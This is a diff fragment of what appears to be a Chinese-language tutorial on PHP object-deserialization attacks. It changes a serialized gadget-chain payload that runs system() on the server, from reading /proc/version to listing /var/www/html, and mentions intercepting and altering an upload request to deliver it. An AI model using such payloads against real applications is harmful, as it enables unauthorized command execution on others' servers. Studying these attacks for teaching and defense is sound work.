@@ -227,7 +227,7 @@ echo serialize(new foo1());
 * 首先利用poc生成序列化的payload
 
 ```
-O:4:"foo1":1:{s:4:"varr";O:4:"foo2":2:{s:4:"varr";s:1:"1";s:3:"obj";O:4:"foo3":1:{s:4:"varr";s:28:"system('cat /proc/version');";}}}
+O:4:"foo1":1:{s:4:"varr";O:4:"foo2":2:{s:4:"varr";s:1:"1";s:3:"obj";O:4:"foo3":1:{s:4:"varr";s:27:"system('ls /var/www/html');";}}}
 ```
 
 * 通过上面的表单上传文件时抓包改包如下
